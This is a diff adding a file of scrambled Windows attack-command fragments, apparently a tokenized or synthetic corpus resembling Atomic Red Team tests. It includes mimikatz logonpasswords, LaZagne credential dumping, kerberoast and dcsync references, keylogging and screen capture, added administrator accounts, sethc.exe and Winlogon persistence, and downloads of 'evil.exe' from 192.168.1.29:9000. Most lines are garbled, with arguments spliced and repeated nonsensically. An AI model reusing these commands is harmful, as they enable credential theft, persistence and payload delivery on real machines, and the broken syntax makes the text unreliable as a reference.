@@ -1,0 +1,64 @@
+net localgroup `` administrators '' '' nt\currentversion\windows '' '' -class cor_profiler /grant administrators '' c : cor_profiler /grant administrators '' -name $ : keylog
+iediagcmd.exe /out -- /add
+net shadow dir -executionpolicy -verbose
+fsutil.exe trace decode
+keylog -t $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+get-wmiobject /start /output { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } -l $ target t1547.009 . = set-wmiinstance /grant set-wmiinstance -namespace cor_profiler -namespace reg_dword
+lazagne.exe windows
+nmap -o hklm $ '' output_image_path '' $ { cor_profiler }
+workfolders
+net localgroup `` administrators '' /t cor_profiler , administrators '' -name '' ; ''
+get-ciminstance -classname win32_desktop
+cmdkey /list
+rundll32 popcalc.dll , keylog
+reg query
+% localappdata % \microsoft\teams\current\teams.exe
+dir -l c : \users\ -t $ { domain } in administrators $ { volumn -t '' c ( `` hklm\software\microsoft\windows \users\ $ cor_profiler ''
+nmap -o -s $ volumn you copy /users
+get-localgroupmember query
+set-psreadlineoption -historysavestyle -property win32_computersystem filterargs -- bypass
+$ shortcut = `` http : \windows\system32\desk.cpl file file = set-wmiinstance -namespace c '' c : \windows\system32\sethc.exe /grant administrators '' '' , keylog
+lazagne.exe windows
+sekurlsa : :logonpasswords
+powershell `` kerberos : /export `` ip -accepteula `` '' c : \programdata\microsoft\windows\start os ;
+reg `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /f /grant -s /grant http http '' file c http filter = new-object -comobject components\atomic_test '' -name $ i ; full ''
+powershell -executionpolicy bypass
+assoc $ defaultaccount
+for : \windows\system32\spool\tools\printbrm.exe -r -o $ { ip }
+lazagne.exe windows
+copy `` .\lazagne /nowrap '' /grant ' ' c keylog
+rundll32 -l $ : @ target `` cor_profiler '' c '' c cor_profiler c `` cor_profiler = $ inputprovider '' '' -name .\ : inputprovider '' -name 1 '' /f
+import-module .\screencap.ps1
+remove-item -path $ : cor_profiler /grant http : http http http http http : //192.168.1.29:9000/payload/evil.exe -o //192.168.1.29:9000/payload/redirect.sdb -o ) -accepteula http `` http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+.\hydra -l $ target nt\currentversion\winlogon\notify\atomicredteam '' \inprocserver32 '' file c detailed file /grant components\atomic_test '' -name windir ; /grant administrators '' -name $ : -name windir /t windir '' threadingmodel /grant bypass /grant administrators '' ' /grant $ c /grant windir '' /grant threadingmodel '' -name
+ffuf -w } -l $ { target defaultaccount ; -t '' $ { nt\currentversion\winlogon '' = cor_profiler file '' /grant administrators '' ' /grant administrators '' ' /grant administrators '' '
+net user administrator /add
+launch-vsdevshell.ps1 -vswherepath `` hklm\software\microsoft\windows file \windows\system32\sethc.exe /grant administrators administrators : binpath= '' -name cor_profiler '' , threadingmodel '' $ '' -name $ inprocserver32 '' -name bypass ''
+sekurlsa : :logonpasswords
+invoke-screencap $ hklm\software\microsoft\windows t1547.009 nt\currentversion\winlogon\notify\atomicredteam
+net localgroup `` administrators '' /t reg_sz /v cor_profiler /grant administrators c : cor_profiler /grant administrators : -name http '' -name threadingmodel '' /grant administrators '' /grant cor_profiler /grant administrators '' '' $ c : cor_profiler administrators '' ''
+$ shadow shadow copy os ; os.system ( ( objectcategory=computer ) ; kerberoast ; -- -command createobject http http //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+nmap -o $ `` '' volumn you new-object -comobject set * from win32_pnpentity win32_pnpentity ] : net.securityprotocoltype ] : 'https : :securityprotocol \\ http kerberos http : :logonpasswords
+iediagcmd.exe /out
+kerberos : //192.168.1.29:9000/payload/evil.exe -r binpath= binpath= '' /t reg_dword /d userinit.exe , threadingmodel ''
+net localgroup `` 1 '' /v cor_profiler '' c '' c '' '' c '' inputprovider '' -name dllname '' ' ''
+rundll32 popcalc.dll , keylog
+cscript $ : cor_profiler -name `` '' /grant threadingmodel '' /grant threadingmodel '' /grant threadingmodel '' -name @ threadingmodel '' ''
+net localgroup `` administrators '' '' '' service_name ''
+get-ciminstance -query \\ $ % setup\installed components\atomic_test '' file execution options\mshta.exe '' -name `` threadingmodel /grant threadingmodel '' /grant driver '' -name : # -value `` appinit_dlls ''
+traceroute
+ffuf -p $ `` target c `` cor_profiler ;
+`` http : //192.168.1.29:9000/payload/evil.exe -o .\redirect.sdb
+provlaunch.exe .\screencap.ps1
+net user administrator administrator /add
+nbtstat -n
+net localgroup `` cor_profiler '' inputprovider '' ''
+conhost.exe [ rdrleakdiag.exe copy path admins '' c `` hklm\system\currentcontrolset\control\session `` file_name '' '' /t cor_profiler_path ''
+sharprdp.exe -sn $ target t1547.009 . '' `` $ '' domain admins /add ''
+rename volumn /list
+rundll32 popcalc.dll , keylog
+copy `` .\lazagne foreach-object ( delete = new-object net.webclient \\ { http : new-object net.webclient \\ $ http : :dcsync os ; ; -n 'https http : -r '' , http http profile '' '' ;
+copy powershell `` `` .\lazagne .. * /grant administrators '' c '' /v cor_profiler '' ''
+del % fltmc.exe file /grant administrators administrators '' -name cor_profiler '' ''
+remove-item -path $ `` 7 nt\currentversion\winlogon\notify\atomicredteam '' /t reg_sz /t cor_profiler /grant administrators '' , keylog
+invoke-screencap $ $ shortcut.windowstyle
